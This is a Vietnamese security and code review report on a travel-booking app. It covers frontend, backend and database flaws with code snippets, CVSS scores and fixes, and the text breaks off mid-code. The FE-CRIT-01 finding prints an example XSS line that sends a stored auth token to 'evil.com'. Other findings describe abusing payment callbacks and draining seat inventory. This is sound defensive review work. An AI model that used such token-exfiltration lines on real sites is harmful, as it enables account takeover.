# BÁO CÁO REVIEW TOÀN DIỆN CODE — VietJourney Advance Solution

> **Repository**: `https://github.com/tvthien-ktmt/Viet-Journey-Advandce-Solution`
> **Ngày review**: 2026-07-06
> **Phạm vi**: Toàn bộ source code (FE + BE + DB + Infra)
> **Mức độ**: Kỹ thuật chuyên sâu, rà soát từng file
> **Loại**: Review-only, KHÔNG fix

---

## MỤC LỤC

1. [Executive Summary](#1-executive-summary)
2. [Thông tin tổng quan dự án](#2-thông-tin-tổng-quan-dự-án)
3. [Phần A — FRONTEND REVIEW](#3-phần-a--frontend-review)
4. [Phần B — BACKEND REVIEW](#4-phần-b--backend-review)
5. [Phần C — DATABASE REVIEW](#5-phần-c--database-review)
6. [Phần D — INFRA & DEVOPS REVIEW](#6-phần-d--infra--devops-review)
7. [Phần E — CONTRACT MISMATCH BE ↔ FE](#7-phần-e--contract-mismatch-be--fe)
8. [Phần F — ROADMAP FIX ĐỀ XUẤT](#8-phần-f--roadmap-fix-đề-xuất)
9. [Phụ lục: Ma trận Severity](#9-phụ-lục-ma-trận-severity)

---

## 1. Executive Summary

### 1.1. Đánh giá tổng quan

VietJourney là một nền tảng đặt tour/khách sạn/chuyến bay mô phỏng Vietnam Airlines, gồm **2 module chính**:

- **Backend**: Spring Boot 3.2.4 / Java 17 / MySQL 8 / Redis / Flyway (119 file Java + 14 migration SQL)
- **Frontend**: React 19 / Vite 8 / TypeScript 6 / TanStack Query / Zustand / Tailwind / shadcn (131 file TS/TSX)

### 1.2. Điểm mạnh (Strengths)

| Hạng mục | Đánh giá |
|---|---|
| Kiến trúc BE | Layered controller→service→repo rõ ràng; Strategy pattern cho booking & payment |
| State machine | `Booking.transitionTo()` chặn transition sai (CONFIRMED→CANCELLED) |
| Documentation | Comments "tại sao" xuất hiện nhiều (BCrypt, Caffeine, Flyway) — quý hiếm |
| Tests | Có `BookingServiceTest`, `AuthServiceTest`, `SecurityTest`, `TourControllerTest`, `HtmlSanitizerTest`, `ProtectedRoute.test` |
| DB migrations | Flyway version hóa V1→V31 đúng chuẩn |
| Concurrency control | `@Version` optimistic lock trên Booking/Payment/Flight + atomic `decrementAvailableSeats` |
| PII protection | Mask email/phone/document trên `/bookings/search` (public endpoint) |
| FE performance | Route-level `lazy()`, `manualChunks`, `React.memo`, TanStack Query `staleTime 5phút` |
| Security primitives | BCrypt (không MD5), JWT + refresh token rotation, JWT blacklist Redis khi logout, Bucket4j rate limit |

### 1.3. Điểm yếu then chốt (Critical Gaps)

1. **Contract mismatch toàn diện giữa BE ↔ FE** — Các flow chính (Auth → Booking → Payment → Confirmation) không chạy được end-to-end do field naming khác nhau (`role` vs `roles`, `totalPrice` vs `totalAmount`, `id` vs `bookingCode`, `status` enum khác nhau).
2. **Scheduler rò rỉ inventory** — `ReservationScheduler` chuyển booking thành EXPIRED nhưng không gọi `strategy.release()` để hoàn trả `flights.available_seats`. Production sẽ mất ghế vĩnh viễn.
3. **JWT leak vào localStorage** — BE dùng HttpOnly cookie đúng, nhưng FE persist `token` + `refreshToken` vào `localStorage` qua Zustand → làm vô dụng bảo mật HttpOnly.
4. **Refresh flow broken end-to-end** — BE không set cookie mới ở `/auth/refresh`, FE không truyền `refreshToken` vào `setAuth()` khi login → sau 15 phút access token hết hạn là logout ngay.
5. **VNPay callback sai thứ tự verify** — Check amount match **trước** khi verify signature → attacker có thể đổi status payment thành "failed" chỉ với `transactionRef` (UUID 8 ký tự, brute-force khả thi).
6. **Endpoint `/api/payments/ipn` không tồn tại** — `SecurityConfig` permitAll cho IPN, `VnpayIpnFilter` check IP, nhưng không có `@PostMapping("/ipn")` → VNPay không thể confirm server-to-server.
7. **Booking/Flight flow FE dùng mock** — `HeroSearch` luôn gọi `mockSearchFlights` bypass flag `USE_MOCK`; `TourDetailPage.handleBook` là `setTimeout` giả.
8. **DB schema issues**: `V29` reference column không tồn tại (`depart_time`/`arrive_time` thay vì `departure_time`/`arrival_time`); một số FK thiếu; thiếu index cho `payments.transaction_ref` UNIQUE; entity `Booking` `@Version` mặc định nhưng logic lock chưa đúng.

### 1.4. Số lượng issue theo Severity

| Severity | BE | FE | DB | Infra | Total |
|---|---|---|---|---|---|
| 🔴 Critical | 9 | 7 | 4 | 1 | **21** |
| 🟠 High | 14 | 11 | 6 | 3 | **34** |
| 🟡 Medium | 11 | 9 | 5 | 2 | **27** |
| 🟢 Low | 5 | 6 | 3 | 1 | **15** |
| **TOTAL** | **39** | **33** | **18** | **7** | **97** |

### 1.5. Khuyến nghị SLA

| Khuyến nghị | Lý do |
|---|---|
| **KHÔNG deploy production** ở trạng thái hiện tại | Scheduler leak ghế + VNPay verify sai thứ tự + JWT leak localStorage |
| **Phase 1 (1–2 tuần)**: Fix 21 Critical | Cho phép flow end-to-end chạy được |
| **Phase 2 (2–3 tuần)**: Fix 34 High | Production-ready cơ bản |
| **Phase 3 (2 tuần)**: Fix 27 Medium + 15 Low | Hardening + DX |

---

## 2. Thông tin tổng quan dự án

### 2.1. Backend Stack

| Thành phần | Phiên bản | Ghi chú |
|---|---|---|
| Spring Boot | 3.2.4 | Cũ; LTS mới nhất 3.3.x/3.4.x |
| Java | 17 | LTS, OK |
| Hibernate | 6.4.x (theo Boot 3.2.4) | OK |
| MySQL Connector | 8.x | OK |
| Flyway | 9.x (theo Boot) | OK |
| JJWT | 0.11.5 | **CŨ** — nên bump 0.12.x |
| Bucket4j | 8.10.1 | OK |
| Caffeine | 3.x | OK |
| jsoup | 1.17.2 | OK |

### 2.2. Frontend Stack

| Thành phần | Phiên bản | Ghi chú |
|---|---|---|
| React | 19.2.7 | Mới nhất |
| Vite | 8.1.1 | Mới nhất |
| TypeScript | 6.0.2 | Mới nhất (experimental?) |
| TanStack Query | 5.101.2 | OK |
| Zustand | 5.0.14 | OK |
| Tailwind | 3.4.19 | OK |
| React Router | 7.18.1 | OK |
| shadcn/ui | 4.12.0 | OK |
| framer-motion | 12.x | OK |
| axios | 1.18.1 | OK |
| oxlint | 1.71.0 | (thay ESLint) — OK |

### 2.3. Cấu trúc thư mục chính

```
backend/src/main/java/com/vietjourney/backend/
├── BackendApplication.java       (entry)
├── config/                       (WebMvc, OpenApi)
├── controller/                   (12 controller)
├── dto/                          (request + response)
├── entity/                       (16 entity)
│   └── enums/BookingStatus
├── exception/                    (5 exception class)
├── repository/                   (11 repository)
├── scheduler/                    (2 scheduler)
├── security/                     (7 class security)
├── service/
│   ├── impl/                     (12 service impl)
│   └── strategy/booking|payment/ (Strategy)
├── util/                         (HtmlSanitizer, PageableUtil)
└── utils/                        (HtmlSanitizer — duplicate)

frontend/src/
├── App.tsx                       (Router)
├── api/                          (client + 7 module + mocks)
├── components/
│   ├── auth/                     (ProtectedRoute + test)
│   ├── blog/
│   ├── common/                   (ErrorBoundary, LotusLogo, PageLoader)
│   ├── dashboard/
│   ├── home/                     (8 component)
│   ├── layout/                   (TopBar, SiteHeader, SiteFooter, SidebarLayout, Header, Footer)
│   └── ui/                       (shadcn: 17 component)
├── data/                         (vna-data, vna-airports, blogs, destinations, images, offers)
├── hooks/                        (useCountdown, useDebounce + tests)
├── layouts/                      (RootLayout, AdminLayout)
├── lib/                          (formatters, utils, vna-types)
├── pages/                        (40+ page)
│   └── admin/                    (5 admin page)
├── store/                        (authStore, langStore, flightSelectionStore)
├── styles/
└── types/                        (4 type file)
```

### 2.4. Thống kê file đã rà soát

| Loại | Số file | Trạng thái |
|---|---|---|
| Backend Java (main) | 119 | Đã rà soát 100% file chính + tất cả entity/repo/service/controller/security/dto/exception/config/scheduler |
| Backend SQL migration | 14 | Đã rà soát 100% (V1, V2, V3, V20, V21, V22, V23, V24, V25, V26, V27, V28, V29, V31) |
| Frontend TS/TSX | 131 | Đã rà soát 100% file chính: App, main, client, store, hooks, api, pages chính, components chính, types, lib, configs |
| Infra | docker-compose, 2 Dockerfile, application.yml, application-dev.yml | Đã rà soát |
| Test | 8 test file (4 BE + 4 FE) | Đã rà soát |

---

## 3. Phần A — FRONTEND REVIEW

> Sắp xếp theo Severity (Critical → Low). Mỗi issue có: ID, file:line, code, impact, root cause, recommendation, CVSS-style score.

### 3.1. 🔴 CRITICAL

#### FE-CRIT-01 — JWT persist vào localStorage (XSS token theft)

**File**: `frontend/src/store/authStore.ts:24-41`

**Code**:
```ts
export const useAuth = create<AuthState>()(
  persist((set, get) => ({ ... }), { 
    name: 'vna-auth',
    partialize: (state) => ({ 
      user: state.user, 
      refreshToken: state.refreshToken,   // ← leak
      token: state.token                  // ← leak
    }) 
  })
);
```

**Impact**: BE đã cố tình set JWT vào **HttpOnly cookie** để JS không đọc được. Tuy nhiên FE persist `token` + `refreshToken` vào `localStorage` (qua `persist` middleware của Zustand) → token bị lộ với **mọi script JS**, kể cả script từ extension hoặc XSS.

**Root cause**: Thiếu hiểu biết về **defense in depth** — HttpOnly cookie có giá trị khi và chỉ khi JS không giữ token song song.

**Attack vector**: Attacker inject 1 dòng `fetch('https://evil.com/?t='+localStorage.getItem('vna-auth'))` qua bất kỳ XSS nào (e.g. dangerouslySetInnerHTML, blog HTML chưa sanitize) → chiếm tài khoản.

**CVSS**: 8.1 (High) — AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:L/A:N

**Recommendation**: 
- Bỏ `token` + `refreshToken` khỏi `partialize`. Chỉ persist `user` (để hiển thị UI trước khi `/auth/me` trả về).
- Refresh token nên chuyển sang **HttpOnly cookie riêng** (BE set).
- Access token **không cần** lưu FE — cookie auto-gửi.

---

#### FE-CRIT-02 — Refresh token flow broken end-to-end

**File**: `frontend/src/api/client.ts:51, 60-67` + `frontend/src/store/authStore.ts:30` + `backend/.../AuthController.java:71-79`

**Chain of failure**:

1. **BE `AuthController.refreshToken`** trả JWT trong body, **không set cookie mới**:
   ```java
   @PostMapping("/refresh")
   public ResponseEntity<ApiResponse<AuthResponse>> refreshToken(@RequestBody Map<String, String> request) {
       ...
       AuthResponse response = authService.refreshToken(token);
       return ResponseEntity.ok(ApiResponse.success(response, "Refresh token thành công"));
       // ← không có response.addHeader(SET_COOKIE, ...)
   }
   ```

2. **FE `LoginPage.handleSubmit`** không truyền `refreshToken` vào `setAuth`:
   ```ts
   setAuth(res.user, res.accessToken || res.token);  // ← thiếu refreshToken
   ```

3. **FE `client.ts` interceptor** đọc `useAuth.getState().refreshToken` → **luôn null**:
   ```ts
   const refreshToken = useAuth.getState().refreshToken;
   if (!refreshToken) {
     useAuth.getState().logout();
     window.location.href = '/login';  // ← luôn đi vào nhánh này
     return Promise.reject(error);
   }
   ```

**Impact**: Sau 15 phút (JWT_EXPIRATION_MS), mọi API call → 401 → interceptor cố refresh → không có refreshToken → logout ngay. **User phải login 96 lần/ngày.**

**Root cause**: Implement không hoàn thiện; thiếu integration test end-to-end.

**CVSS**: 7.5 (High) — AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H (Availability impact cao — user không thể dùng app)

**Recommendation**:
- BE `refreshToken`: replicate `setCookie` như `login()`.
- FE `LoginPage`: `setAuth(res.user, res.token, res.refreshToken)`.
- FE `client.ts`: ưu tiên dựa vào cookie HttpOnly (axios `withCredentials: true` đã có), không cần truyền refresh token thủ công.

---

#### FE-CRIT-03 — User role contract mismatch (ProtectedRoute always blocks)

**File**: `frontend/src/store/authStore.ts:4-12` vs `backend/.../dto/response/UserDTO.java`

**BE trả về**:
```java
public class UserDTO {
    private String role;   // ← String đơn ("USER" hoặc "ADMIN")
}
```

**FE expect**:
```ts
export interface AuthUser {
  roles: ('USER' | 'ADMIN')[];  // ← Array
}
```

**Impact**: 
- `ProtectedRoute.hasRole(r) = user?.roles.includes(r)` → `roles` luôn `undefined` → **luôn return false**.
- User đã login không vào được protected routes (`/booking/:id`, `/payment/:bookingId`, `/dashboard`, `/profile`).
- Admin không vào được `/admin`.

**Root cause**: BE thiết kế `role: String` (single role), FE thiết kế `roles: string[]` (multi-role) — không đồng bộ.

**CVSS**: 8.2 (High) — AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:H (app completely unusable cho authenticated user)

**Recommendation**: Đồng bộ 1 trong 2 cách:
- (A) BE trả `roles: String[]` và `CustomUserDetails.getAuthorities()` đa role.
- (B) FE đơn giản hóa thành `role: 'USER' | 'ADMIN'` và `ProtectedRoute` check `user?.role === r`.

---

#### FE-CRIT-04 — PaymentPage luôn redirect về home

**File**: `frontend/src/pages/PaymentPage.tsx:39-41`

**Code**:
```tsx
if (booking.status !== 'PENDING_PAYMENT') {
  return <Navigate to="/" replace />; // Redirect if wrong status
}
```

**BE không có status `PENDING_PAYMENT`**. `BookingStatus` enum BE = `PENDING, RESERVED, CONFIRMED, CANCELLED, EXPIRED, FAILED`.

**Impact**: User đi qua flow Booking → Hold → cập nhật passenger → đến trang Payment → **luôn redirect về home**. Tính năng thanh toán **hoàn toàn broken**.

**Root cause**: FE đặt `BookingStatus = 'HOLD' | 'PENDING_PAYMENT' | ...` (xem `types/flight.ts:48`) trong khi BE dùng `PENDING, RESERVED, CONFIRMED, ...`. Cùng tên khái niệm nhưng khác giá trị.

**CVSS**: 8.2 (High) — Critical business flow bị block hoàn toàn.

**Recommendation**: Đồng bộ enum status 2 bên. Đề xuất: dùng đúng giá trị BE trả về (RESERVED = đang chờ thanh toán).

---

#### FE-CRIT-05 — BookingDTO field naming mismatch toàn diện

**File**: `frontend/src/types/flight.ts:50-61` vs `backend/.../dto/response/BookingDTO.java`

| FE `FlightBooking` field | BE `BookingDTO` field | Match? |
|---|---|---|
| `bookingCode: string` | (không có — chỉ có `id: Long`) | ❌ |
| `totalAmount: number` | `totalPrice: BigDecimal` | ❌ |
| `expiresAt: string` | `reservedUntil: LocalDateTime` | ❌ |
| `outboundFlight: Flight` | (không có — chỉ có `referenceId: Long` + `bookingType`) | ❌ |
| `returnFlight: Flight` | (không có) | ❌ |
| `contactEmail: string` | (không có — chỉ có `passengers[].email`) | ❌ |
| `contactPhone: string` | (không có) | ❌ |
| `passengers: Passenger[]` | `passengers: BookingPassengerDTO[]` (nhưng field khác — `fullName` vs `firstName/lastName`) | ❌ |

**Impact**: 
- `PaymentPage.tsx:81`: `booking.outboundFlight.from` → `undefined.from` → TypeError → crash.
- `BookingDetailPage.tsx:33`: `booking?.outboundFlight?.from` → undefined → UI render sai.
- `ConfirmationPage.tsx:60`: `booking.outboundFlight` → undefined → crash.
- `SeatHoldPage.tsx:132`: `booking.bookingCode` → undefined → render "Mã đặt chỗ: undefined".

**Root cause**: BE thiết kế booking generic theo pattern `bookingType + referenceId` (một booking có thể là tour/hotel/flight), trong khi FE thiết kế booking **chỉ cho flight** với cấu trúc phong phú hơn.

**CVSS**: 9.1 (Critical) — AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H

**Recommendation**: 
- Hoặc BE thiết kế lại BookingDTO có polymorphism theo `bookingType` (FlightBookingDTO, HotelBookingDTO, TourBookingDTO).
- Hoặc FE đơn giản hóa để khớp BE generic.
- Thêm codegen từ OpenAPI sang TS type để chặn issue này ngay từ compile time.

---

#### FE-CRIT-06 — HeroSearch luôn dùng mock (bypass USE_MOCK flag)

**File**: `frontend/src/components/home/HeroSearch.tsx:137`

**Code**:
```ts
async function onSubmit(e: React.FormEvent) {
  ...
  try {
    const json = await mockSearchFlights(payload);  // ← bypass flag
    setData(json);
  } catch ...
}
```

Trong khi `frontend/src/api/flights.ts:6` có flag `USE_MOCK = import.meta.env.VITE_USE_MOCK_API === 'true' || false;` — HeroSearch **ignore hoàn toàn** flag này và luôn gọi mock.

**Impact**: Dù set `VITE_USE_MOCK_API=false` để dùng BE thật, trang chủ vẫn gọi mock. User search → mock data → bấm "Tiếp tục" → `navigate('/booking/temp-id/hold', ...)` với literal string `"temp-id"` → flow vỡ.

**Root cause**: Component viết trước khi có API module; không refactor để dùng `searchFlights(payload)`.

**CVSS**: 6.5 (Medium-High) — AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L

**Recommendation**: Thay `mockSearchFlights(payload)` bằng `searchFlights(payload)` từ `@/api/flights`.

---

#### FE-CRIT-07 — URL `temp-id` literal + flow booking vỡ khi refresh

**File**: `frontend/src/pages/FlightResultsPage.tsx:107` + `frontend/src/pages/SeatHoldPage.tsx:43-77`

**Code FlightResultsPage**:
```ts
navigate('/booking/temp-id/hold', { state: { outbound, return: ret, request: form } })
```

**Code SeatHoldPage**:
```ts
const [createdBookingId, setCreatedBookingId] = useState<string | null>(null);
const activeId = createdBookingId || (bookingId !== 'temp-id' ? bookingId : null);

useEffect(() => {
  if (bookingId === 'temp-id' && location.state) {
    ...
    holdMutation.mutate({ ...state, contactEmail: 'guest@example.com', contactPhone: '0901234567' });
  }
}, [bookingId, location.state, activeId, holdMutation, navigate]);
```

**Impact**:
1. **URL không có ý nghĩa** — user copy URL gửi cho người khác không mở được (state truyền qua router là in-memory, không persist).
2. **Refresh trang → state mất → flow vỡ**. `location.state` undefined khi refresh → `holdMutation.mutate` không chạy → `activeId` null → `if (!activeId && bookingId !== 'temp-id') navigate('/')` → user bị đá về home.
3. **Hardcoded contact**: `guest@example.com`, `0901234567` — vi phạm privacy và không có validation.
4. **Race condition**: `useEffect` deps bao gồm `holdMutation` (object thay đổi mỗi render) → có thể trigger multiple mutation.

**Root cause**: Thiết kế flow FE không考虑 refresh; mock-first architecture.

**CVSS**: 7.5 (High) — UX broken, race condition.

**Recommendation**: 
- Tạo booking qua API **ngay khi user chọn flight** (POST `/api/bookings`), nhận `id` thật, navigate tới `/booking/{id}/hold`.
- Loại bỏ khái niệm `temp-id`.

---

### 3.2. 🟠 HIGH

#### FE-HIGH-01 — ProtectedRoute dựa vào localStorage cho auth state

**File**: `frontend/src/components/auth/ProtectedRoute.tsx:10-16`

```tsx
const isAuthenticated = useAuth((s) => s.isAuthenticated);
...
if (!isAuthenticated()) {
  return <Navigate to="/login" state={{ from: location }} replace />;
}
```

`isAuthenticated()` chỉ check `!!get().user` — `user` được persist từ localStorage. Sau khi cookie JWT expired, localStorage vẫn còn `user` → user vào được protected route → API 401 → interceptor refresh fail → logout + redirect → **flash of content**.

**Recommendation**: Trên app init, call `/auth/me` để verify cookie còn hợp lệ; set `user = null` nếu 401.

---

#### FE-HIGH-02 — BookingApi.get() type không khớp BE

**File**: `frontend/src/api/booking.ts:18-19`

```ts
get: (id: string): Promise<FlightBooking> =>
  USE_MOCK ? mockGetBooking(id) : api.get(`/bookings/${id}`),
```

- Type trả về `FlightBooking` (cấu trúc mock) nhưng BE trả `BookingDTO` (generic).
- Endpoint dùng `id: string` nhưng BE nhận `id: Long` (path variable).
- BE có endpoint `/api/bookings/{id}` trả `BookingDTO` nhưng FE expect cấu trúc `FlightBooking`.

**Recommendation**: Sinh TS types từ OpenAPI; bỏ `FlightBooking` mock type; dùng `Booking` từ `types/index.ts`.

---

#### FE-HIGH-03 — `updatePassengers` gọi endpoint không tồn tại

**File**: `frontend/src/api/booking.ts:20-21`

```ts
updatePassengers: (id: string, pax: Passenger[]): Promise<FlightBooking> =>
  USE_MOCK ? mockUpdatePassengers(id, pax) : api.post(`/bookings/${id}/passengers`, pax),
```

BE không có endpoint `POST /api/bookings/{id}/passengers`. `BookingController` chỉ có: POST `/api/bookings`, GET `/api/bookings/{id}`, GET `/api/bookings/my-bookings`, GET `/api/bookings/search`.

**Recommendation**: Hoặc BE thêm endpoint `PUT /api/bookings/{id}/passengers`, hoặc FE gộp luôn vào `createBooking`.

---

#### FE-HIGH-04 — Flight search endpoint URL sai

**File**: `frontend/src/api/flights.ts:10`

```ts
return api.get<FlightSearchResponse>('/flights/search', { params: req });
```

BE `FlightController` có `@GetMapping` trên `/api/flights` (không có `/search`). Gọi `/api/flights/search` → 404.

**Recommendation**: Đổi sang `api.get('/flights', { params: req })` hoặc BE thêm `@GetMapping("/search")`.

---

#### FE-HIGH-05 — TourDetailPage.handleBook là setTimeout giả

**File**: `frontend/src/pages/TourDetailPage.tsx:25-37`

```ts
const handleBook = () => {
  if (!isAuthenticated()) { ... return; }
  setIsBooking(true);
  setTimeout(() => {
    setIsBooking(false);
    toast.success('Gửi yêu cầu đặt tour thành công! Nhân viên sẽ liên hệ lại với bạn.');
  }, 1500);
};
```

Không gọi API. User bấm "Đặt tour" → đợi 1.5s → toast success → không có booking nào được tạo.

**Recommendation**: Gọi `api.post('/bookings', { bookingType: 'tour', referenceId: tour.id, passengers: [...] })` rồi navigate tới `/payment/{bookingId}`.

---

#### FE-HIGH-06 — AdminDashboardPage dùng mock cho toàn bộ chart

**File**: `frontend/src/pages/admin/AdminDashboardPage.tsx:26-29`

```ts
const revenue = ADMIN_STATS.revenueByMonth;
const routeStats = ADMIN_STATS.bookingsByRoute;
const cabinStats = ADMIN_STATS.cabinDistribution;
const loadFactor = ADMIN_STATS.loadFactorByMonth;
```

Cả 4 chart dùng mock. BE `AdminServiceImpl.getAdminStats()` chỉ trả `totalBookings` + `revenue` (dạng string "123 VND"). Tức là admin dashboard hiện tại là **shell UI** — không có data thật ngoài 2 con số.

**Recommendation**: BE implement thêm 4 endpoint revenue-by-month, bookings-by-route, cabin-distribution, load-factor.

---

#### FE-HIGH-07 — `api/admin.ts` force USE_MOCK = true

**File**: `frontend/src/api/admin.ts:5`

```ts
const USE_MOCK = import.meta.env.VITE_USE_MOCK_API === 'true' || true; // Force mock for admin
```

`|| true` → flag vô dụng. Admin pages luôn dùng mock.

**Recommendation**: Bỏ `|| true`; implement BE endpoints tương ứng.

---

#### FE-HIGH-08 — Nhiều `as any` và type escape hatch

**Files**:
- `LoginPage.tsx:31`: `const res = await authApi.login(email, password) as any;`
- `PaymentPage.tsx:24`: `onSuccess: (data: any) => {...}`
- `BookingHistoryPage.tsx:17`: `const res: any = await bookingApi.getMyBookings();`
- `DashboardPage.tsx:23`: `(bookingsData as any)?.content || (bookingsData as any)?.data?.content`
- `ManageBookingPage.tsx:47`: `const res: any = await bookingApi.search(code, lastName);`
- `ConfirmationPage.tsx` dùng `booking.contactEmail`, `booking.totalAmount` không có trong type.

`LoginResponse` khai `accessToken: string` nhưng BE trả `token: string` → type "compile OK" nhưng runtime sai.

**Recommendation**: Sinh types từ OpenAPI; bỏ `as any`; config oxlint `no-explicit-any: error`.

---

#### FE-HIGH-09 — `api.get` truyền sai argument cho params

**File**: `frontend/src/api/client.ts:82-86` + `api/booking.ts:24-25`

```ts
// client.ts
get: <T>(url: string, params?: object): Promise<T> => 
  apiClient.get(url, { params }).then(...),

// booking.ts
search: (code: string, lastName: string) => 
  api.get(`/bookings/search`, { params: { code, lastName } }),
```

Gọi `api.get(url, { params: {...} })` → axios nhận `{ params: { params: { code, lastName } } }` (nested) → query string rỗng.

Tương tự `blog.ts:10`, `tours.ts:27`, `hotels.ts:25` — đều sai pattern.

**Recommendation**: Sửa `api.get(url, params)` → `apiClient.get(url, { params })`.

---

#### FE-HIGH-10 — BookingHistoryPage không dùng TanStack Query

**File**: `frontend/src/pages/BookingHistoryPage.tsx:13-26`

```ts
useEffect(() => {
  if (!isAuthenticated) return;
  const fetchBookings = async () => {
    try {
      const res: any = await bookingApi.getMyBookings();
      setBookings(res.content || res.data?.content || []);
    } catch ...
  };
  fetchBookings();
}, [isAuthenticated]);
```

Codebase có TanStack Query (dùng ở `DashboardPage`, `BookingDetailPage`, `PaymentPage`...) nhưng `BookingHistoryPage` vẫn dùng `useEffect + useState` thủ công. Inconsistent + không có cache + không auto refetch.

**Recommendation**: Refactor sang `useQuery({ queryKey: ['my-bookings'], queryFn: ... })`.

---

#### FE-HIGH-11 — VitePWA devOptions.enabled = true

**File**: `frontend/vite.config.ts:13-15`

```ts
VitePWA({
  registerType: 'autoUpdate',
  devOptions: { enabled: true },
  ...
})
```

Service worker cache trong dev → code mới không hiển thị (cache stale) → dev khó debug.

**Recommendation**: `devOptions: { enabled: process.env.NODE_ENV === 'production' }` hoặc bỏ hẳn.

---

### 3.3. 🟡 MEDIUM

#### FE-MED-01 — ErrorBoundary không có reset boundary

`components/common/ErrorBoundary.tsx` — `hasError = true` sẽ không bao giờ reset trừ khi reload trang. Nên expose `resetErrorBoundary` prop hoặc dùng `react-error-boundary`.

#### FE-MED-02 — Hardcoded Unsplash URLs

`TourDetailPage.tsx:64-73`, `HotelsPage.tsx:8-11`, `ToursPage.tsx:9-14`, `LoginPage.tsx:53` — phụ thuộc Unsplash. Khi rate-limit hoặc đổi URL → images broken. Nên self-host.

#### FE-MED-03 — DashboardPage硬 coded stats

`DashboardPage.tsx:67,79,91` — `4,500` điểm thưởng, `8` đánh giá, `15%` tiết kiệm là literal.

#### FE-MED-04 — `useCountdown` không cleanup đúng khi expiresAt thay đổi

`hooks/useCountdown.ts:8-13` — `setInterval` tạo mỗi khi `expiresAt` thay đổi; interval cũ chưa kịp clear thì interval mới đã tạo → có thể duplicate.

#### FE-MED-05 — `seatSelectionPage` hardcoded 2 passengers

`SeatSelectionPage.tsx:47` — `const requiredSeats = 2; // Mock 2 passengers for demo`. Không đọc từ booking thực.

#### FE-MED-06 — `localStorage.setItem('booking_${id}_seats', ...)` không cleanup

`SeatSelectionPage.tsx:125` — lưu ghế đã chọn vào localStorage; không xóa sau khi booking confirm → rò rỉ data cũ.

#### FE-MED-07 — `BookingDetailPage` dùng `material-symbols-outlined` class không import font

`BookingDetailPage.tsx:22,39,43,...` — dùng class `material-symbols-outlined` nhưng không thấy import Google Material Symbols font trong `index.css` hoặc `index.html`. Icons sẽ không hiển thị.

#### FE-MED-08 — `useDebounce.test.ts` và `useCountdown.test.ts` tồn tại nhưng không CI

Có test files nhưng không thấy GitHub Actions workflow.

#### FE-MED-09 — `bookingApi.search` response không dùng `maskPII`

BE `/api/bookings/search` trả booking đã `maskPII()` (mask email/phone). FE `ManageBookingPage` expect `firstName/lastName` tách biệt → render sai.

---

### 3.4. 🟢 LOW

#### FE-LOW-01 — `class-variance-authority` và `clsx` + `tailwind-merge` trùng lặp
#### FE-LOW-02 — `components/ui/index.ts` export barrel không nhất quán
#### FE-LOW-03 — Một số file imports theo absolute path `../store/langStore` thay vì `@/store/langStore` (e.g. `SeatHoldPage.tsx:9`)
#### FE-LOW-04 — `BookingDetailPage.tsx:80,85` — ternary luôn trả về cùng giá trị `'Oct 15, 2024'`
#### FE-LOW-05 — `DashboardPage.tsx:33` — text "Here is a summary of your travel activities" bằng tiếng Anh trong khi toàn bộ app tiếng Việt — thiếu i18n
#### FE-LOW-06 — `index.html` không có meta description / og tags

---

## 4. Phần B — BACKEND REVIEW

### 4.1. 🔴 CRITICAL

#### BE-CRIT-01 — Scheduler hết hạn booking không release ghế (Inventory leak)

**File**: `backend/.../scheduler/ReservationScheduler.java:24-29` + `service/strategy/booking/*.release()`

**Code**:
```java
@Async
@Scheduled(cron = "0 * * * * *")
@Transactional
public void releaseExpiredReservations() {
    int updatedCount = bookingRepository.expireReservations(LocalDateTime.now());
    if (updatedCount > 0) {
        log.info("Released {} expired reservations.", updatedCount);
    }
}
```

`bookingRepository.expireReservations` chỉ `UPDATE bookings SET status=EXPIRED WHERE ...` — **không gọi `strategy.release()`**.

Hệ quả:
- `FlightBookingStrategy.release()` có implementation `incrementAvailableSeats` nhưng **không bao giờ được gọi**.
- `TourBookingStrategy.release()` và `HotelBookingStrategy.release()` là method rỗng.
- Booking expired → ghế vẫn "đã decrement" → **inventory vĩnh viễn sai**.

**Production impact**: Sau N ngày chạy, `flights.available_seats` giảm dần về 0 cho mọi chuyến bay, dù không có booking nào thực sự confirmed. **DoS tự sinh.**

**CVSS**: 9.1 (Critical) — AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H

**Recommendation**: 
```java
@Scheduled(cron = "0 * * * * *")
@Transactional
public void releaseExpiredReservations() {
    List<Booking> expired = bookingRepository.findExpiredReservations(LocalDateTime.now());
    for (Booking b : expired) {
        BookingItemStrategy strategy = factory.getStrategy(b.getBookingType());
        int qty = b.getPassengers() != null ? b.getPassengers().size() : 1;
        strategy.release(b.getReferenceId(), qty);
        b.transitionTo(BookingStatus.EXPIRED);
    }
    bookingRepository.saveAll(expired);
}
```

---

#### BE-CRIT-02 — `createBooking` cho phép anonymous + không rate limit

**File**: `backend/.../controller/BookingController.java:27-30` + `service/impl/BookingServiceImpl.java:35-40`

```java
@PostMapping
public ResponseEntity<ApiResponse<BookingDTO>> createBooking(
    @Valid @RequestBody BookingRequest request, 
    Authentication authentication) {
    String email = authentication != null ? authentication.getName() : null;
    BookingDTO bookingDTO = bookingService.createReservation(request, email);
    ...
}
```

Service xử lý `userEmail == null` (tạo booking không có user). SecurityConfig hiện yêu cầu auth cho `/api/bookings` (OK), nhưng:

1. **Không có rate limit** trên endpoint này → user authenticated có thể spam tạo booking để **cạn kiệt ghế** (mỗi booking giảm `availableSeats` trong 10 phút).
2. Nếu sau này đổi SecurityConfig thành `permitAll` (cho guest booking), flow vẫn chạy → rủi ro tiềm ẩn.
3. Không check `quantity` tối đa — user có thể gửi `passengers: [...]` dài 1000 phần tử → 1 request decrement 1000 ghế.

**CVSS**: 7.5 (High) — AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:H

**Recommendation**:
- Rate limit per user (e.g. 5 booking/10 phút).
- Validate `passengers.size() <= 9`.
- Nếu hỗ trợ guest booking, generate anonymous user_id (UUID) và gắn vào booking.

---

#### BE-CRIT-03 — VNPay callback verify sai thứ tự (Auth bypass)

**File**: `backend/.../service/impl/PaymentServiceImpl.java:62-94`

```java
@Transactional
public PaymentResponse handleCallback(Map<String, String> params) {
    String transactionRef = params.get("vnp_TxnRef");
    ...
    Payment payment = paymentRepository.findByTransactionRef(transactionRef).orElseThrow(...);
    
    // 1. Check amount match TRƯỚC
    if (amountRaw != null) {
        ...
        if (amount != expectedAmount) {
